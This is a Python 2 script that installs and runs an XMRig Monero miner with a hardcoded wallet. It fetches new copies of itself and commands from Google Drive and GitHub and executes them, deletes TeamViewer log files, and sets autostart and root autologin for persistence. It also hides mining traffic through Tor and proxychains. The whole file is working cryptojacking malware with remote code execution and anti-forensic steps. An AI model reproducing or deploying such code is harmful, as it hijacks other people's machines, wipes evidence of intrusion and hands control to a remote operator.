#!/usr/bin/env python
__author__ = 'root'
import time,socket
import urllib2
import urllib
import os, sh, sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'xmrig'
os.system('pkill ' + program)
# from pyvirtualdisplay import Display
# file = raw_input("Input link file:")
# solanlap = int(raw_input("Input how many replay:"))
cores = int(multiprocessing.cpu_count()/2)
print 'So luong cores cpu la ' + str(cores)
if cores <= 0:
    cores = 1
if cores == 1 or cores == 2:
    affinity = '0x5'
elif cores == 3 or cores == 4 :
    affinity = '0x55'
elif cores == 5 or cores == 6 :
    affinity = '0x555'
elif cores == 7 or cores == 8 :
    affinity = '0x5555'
elif cores == 9 or cores == 10 :
    affinity = '0x55555'
elif cores == 11 or cores == 12 :
    affinity = '0x555555'
elif cores == 13 or cores == 14 :
    affinity = '0x5555555'
elif cores == 15 or cores == 16 :
    affinity = '0x55555555'
elif cores == 17 or cores == 18 :
    affinity = '0x555555555'
elif cores == 19 or cores == 20 :
    affinity = '0x5555555555'
print affinity
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
def renew_connection():
    conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="Hoanglan@123")
    conn.send_signal("NEWNYM")
    conn.close()
if os.path.isfile(str(os.path.dirname(os.path.realpath(__file__))) + '/proxy') == True:
    openproxy = open(os.path.dirname(os.path.realpath(__file__)) + '/proxy', 'r')
    proxy = openproxy.read().strip()
    openproxy.close()
    useproxy = 1
    #openrealproxy = open(os.path.dirname(os.path.realpath(__file__)) + '/proxy1', 'r')
    #realproxy = openrealproxy.read().strip()
    #openrealproxy.close
    print proxy
if useproxy == 1:
    arrayproxy = proxy.split(":")
    ip = arrayproxy[0].strip()
    port = arrayproxy[1].strip()
    #ip = str(ip)
    print ip
    print port
    #time.sleep(100000)
    opensocket = socket.socket()
    #print opensocket
    try:
        connect = opensocket.connect((ip,int(port)))
        realproxy = "{'https': '" + proxy + "'}"
        proxy_error = 0
        print realproxy
    except:
        print 'Error connect proxy at ' + ip + ':' + port
        proxy_error = 1
    if proxy_error == 0:
        linktestproxy = 'https://docs.google.com/uc?authuser=0&id=1aqvBEV-Ta99s_QJ-VrmVP345qG13T7kQ&export=download'
        #linktestproxy = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_cEdGODA5ODRmTlE&export=download'
        print linktestproxy
        try:
            proxytext = ast.literal_eval(realproxy)
            print proxytext
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
            downloadtestproxy = urllib2.urlopen(linktestproxy)
            readtestproxy = downloadtestproxy.read().strip()
            print readtestproxy
        except:
            pass
        if readtestproxy <> 'proxy_ok':
            print 'Proxy error'
            linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
            print linktestproxy
            proxytext = ast.literal_eval(realproxy)
            print proxytext
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
            downloadtestproxy = urllib2.urlopen(linktestproxy)
            readtestproxy = downloadtestproxy.read().strip()
            print readtestproxy
            if readtestproxy <> 'proxy_ok':
                print "Proxy error"
                proxy_error = 1
            else:
                print 'Connected proxy at ' + ip + ':' + port
                opensocket.close()
        else:
            print 'Connected proxy at ' + ip + ':' + port
            opensocket.close()
    if proxy_error == 1:
        proxy_error = 0
        allproxy = ('10.33.224.211,10.29.224.211,10.30.224.235,10.53.224.212,10.37.224.30,10.32.224.39,10.16.224.7,10.1.225.4')
        allport = ('8118,8118,8118,8118,8118,8118,8080,8080')
        arrayallproxy = allproxy.split( ",")
        arrayallport = allport.split(",")
        for i in range(0,len(arrayallproxy),1):
            try:
                print arrayallproxy[i] + ':' + arrayallport[i]
                connect = opensocket.connect((arrayallproxy[i], int(arrayallport[i])))
                realproxy = "{'https': '" + arrayallproxy[i] + ":" + arrayallport[i] + "'}"
                proxy_error = 0
                print 'Connected proxy at ' + ip + ':' + port
            except:
                print 'Error connect proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                proxy_error = 1
                pass
            if proxy_error == 0:
                linktestproxy = 'https://docs.google.com/uc?authuser=0&id=1aqvBEV-Ta99s_QJ-VrmVP345qG13T7kQ&export=download'
                # linktestproxy = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_cEdGODA5ODRmTlE&export=download'
                print linktestproxy
                try:
                    proxytext = ast.literal_eval(realproxy)
                    print proxytext
                    proxyuse = urllib2.ProxyHandler(proxytext)
                    opener = urllib2.build_opener(proxyuse)
                    urllib2.install_opener(opener)
                    downloadtestproxy = urllib2.urlopen(linktestproxy)
                    readtestproxy = downloadtestproxy.read().strip()
                    print readtestproxy
                except:
                    pass
                if readtestproxy <> 'proxy_ok':
                    print 'Connect google drive error, try github'
                    linktestproxy = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/proxyok'
                    print linktestproxy
                    proxytext = ast.literal_eval(realproxy)
                    print proxytext
                    proxyuse = urllib2.ProxyHandler(proxytext)
                    opener = urllib2.build_opener(proxyuse)
                    urllib2.install_opener(opener)
                    downloadtestproxy = urllib2.urlopen(linktestproxy)
                    readtestproxy = downloadtestproxy.read().strip()
                    print readtestproxy
                    if readtestproxy <> 'proxy_ok':
                        print "Proxy error"
                        proxy_error = 1
                        useproxy = 0
                    else:
                        print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                        opensocket.close()
                        break
                else:
                    print 'Connected proxy at ' + arrayallproxy[i] + ':' + arrayallport[i]
                    opensocket.close()
                    break
if proxy_error == 1:
    useproxy = 0
print useproxy
try:
    version = '2.3'
    #linkversion = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_TzZwa1hQVTBLaWc&export=download'
    linkversion = 'https://google.com'
    if useproxy == 1:
        proxytext = ast.literal_eval(realproxy)
        proxyuse = urllib2.ProxyHandler(proxytext)
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    downloadversion = urllib2.urlopen(linkversion)
    readversion = downloadversion.read().strip()
    print readversion
    if len(readversion) > 50:
        print 'Download file readversion o google drive error, thu link github'
        linkversion = 'https://raw.githubusercontent.com/nhatquanglan/cpuminer-multi/master/linux/versiondao'
        if useproxy == 1:
            proxytext = ast.literal_eval(realproxy)
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        downloadversion = urllib2.urlopen(linkversion)
        readversion = downloadversion.read().strip()
        #print 'dang o day'
        print readversion
except urllib2.URLError:
    readversion = version
    pass
except BadStatusLine:
    readversion = version
    pass
except socket_error as serr:
    readversion = version
    pass
if version != readversion:
    try:
        linkcodedao = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_UzZBMHd6TjdwREE&export=download'
        if useproxy == 1:
            proxytext = ast.literal_eval(realproxy)
            proxyuse = urllib2.ProxyHandler(proxytext)
            opener = urllib2.build_opener(proxyuse)
            urllib2.install_opener(opener)
        downloadlinkcodedao = urllib2.urlopen(linkcodedao)
        noidung = downloadlinkcodedao.read()
        if noidung.find('/usr/bin/env') != -1:
            code = open(os.path.realpath(__file__), 'w')
            code.write(noidung)
            code.close()
            print "Update Code"
            # restart code
            os.execv(__file__, sys.argv)
        elif noidung.find == -1:
            print "Download codedao tu google drive error, thu link github"

    except urllib2.URLError:
        pass
    except BadStatusLine:
        pass
    except socket_error as serr:
        pass
# download command
try:
    os.system('rm -rf /opt/teamviewer/logfiles/*.log')
    os.system('rm -rf /opt/teamviewer/logfiles/*.txt')
except:
    pass
# Update cpuminer
if os.path.isfile(str(os.path.dirname(os.path.realpath(__file__))) + '/versiondll') == False:
    os.system('echo 2.8.1 >' + str(os.path.dirname(os.path.realpath(__file__))) + '/versiondll')
# Read versiondll
openversiondll = open(os.path.dirname(os.path.realpath(__file__)) + '/versiondll', 'r')
versiondll = openversiondll.read().strip()
openversiondll.close()
print versiondll
try:
    linkversiondllnew = 'https://docs.google.com/uc?authuser=0&id=15flFHc8I0zfumXoXZWvHD8IRR5sAaIyk&export=download'
    if useproxy == 1:
        proxytext = ast.literal_eval(realproxy)
        proxyuse = urllib2.ProxyHandler(proxytext)
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    downloadversiondllnew = urllib2.urlopen(linkversiondllnew)
    readversiondllnew = downloadversiondllnew.read().strip()
    print readversiondllnew
except urllib2.URLError:
    readversiondllnew = versiondll
    pass
except BadStatusLine:
    readversiondllnew = versiondll
    pass
except socket_error as serr:
    readversiondllnew = versiondll
    pass
if readversiondllnew != versiondll:
    os.system('echo ' + readversiondllnew + ' >' + str(os.path.dirname(os.path.realpath(__file__))) + '/versiondll')
    os.system('pkill yum')
    os.system('rm -rf xmrig')
    os.system('sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libmicrohttpd-devel libuv-static')
    if useproxy == 1:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + proxy + '\'')
    else:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git')
    # time.sleep (30)
    os.chdir('xmrig')
    os.mkdir('build')
    os.chdir('build')
    os.system('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib64/libuv.a')
    os.system('make')
    workingdir = os.getcwd()
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')

try:
    linkcommand = 'https://docs.google.com/uc?authuser=0&id=0B90x4o1Yvnl_QzBMOENzb2plZnM&export=download'
    if useproxy == 1:
        proxytext = ast.literal_eval(realproxy)
        proxyuse = urllib2.ProxyHandler(proxytext)
        opener = urllib2.build_opener(proxyuse)
        urllib2.install_opener(opener)
    downloadlinkcommand = urllib2.urlopen(linkcommand)
    commandread = downloadlinkcommand.read().strip()
    if commandread.find(program) != -1:
        command = commandread + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
    else:
        command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + ' --cpu-affinity=' + affinity + ' -t ' + str(cores)
except urllib2.URLError:
    command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + '--cpu-affinity=' + affinity + ' -t ' + str(cores)
    pass
except BadStatusLine:
    pass
except socket_error as serr:
        # command = program + ' --variant 1 -a cryptonight -o stratum+tcp://pool.minexmr.com:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001 -t ' + str(cores)
    command = program + ' -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -o stratum+tcp://pool.minexmr.com:443' + '--cpu-affinity=' + affinity + ' -t ' + str(cores)
    pass
# write to /etc/X11/xinit/xinitrc.d/localuser.sh
localuser = open('/etc/X11/xinit/xinitrc.d/localuser.sh', 'w')
localuser.write('#!/bin/bash\ngnome-terminal -e \'python \"/root/Desktop/dao.py\"\'')
localuser.close()
# write to /etc/gdm/custom.conf
custom = open('/etc/gdm/custom.conf', 'w')
custom.write('[daemon]\nAutomaticLoginEnable=True\nAutomaticLogin=root\n[security]\n\n[xdmcp]\n\n[greeter]\n\n[chooser]\n\n[debug]')
custom.close()
if os.path.isfile('/usr/local/bin/xmrig') == False:
    os.system('pkill yum')
    os.system('rm -rf xmrig')
    os.system('sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libmicrohttpd-devel libuv-static')
    # os.system ('yum localinstall -y rpm-cli.rpm')
    # git.Git().clone("git://github.com/JayDDee/cpuminer-opt.git")
    if useproxy == 1:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git --config \'http.proxy=' + proxy + '\'')
    else:
        os.system('git clone https://github.com/nhatquanglan/xmrig.git')
    # time.sleep (30)
    os.chdir('xmrig')
    os.mkdir('build')
    os.chdir('build')
    os.system('cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib64/libuv.a')
    os.system('make')
    workingdir = os.getcwd()
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/local/bin/xmrig')
    os.system('ln -s -f ' + workingdir + '/xmrig /usr/bin/xmrig')
if os.path.isfile('/usr/local/bin/proxychains4') == False:
    # os.system ('yum localinstall -y rpm-cli.rpm')
    # git.Git().clone("git://github.com/JayDDee/cpuminer-opt.git")
    if useproxy == 1:
        os.system('rm -rf proxychains-ng')
        os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git --config \'http.proxy=' + proxy + '\'')
    else:
        os.system('git clone https://github.com/nhatquanglan/proxychains-ng.git')
    # time.sleep (30)
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
if useproxy == 0:
    print command
    os.system(command + '&')
else:
    print command
    print 'starting tor'
    os.system('systemctl restart tor')
    time.sleep (60)
    os.system('systemctl restart tor')
    time.sleep (60)
    os.system('proxychains4 ' + command + '&')
while 1:
    time.sleep(10800)
    os.execv(__file__, sys.argv)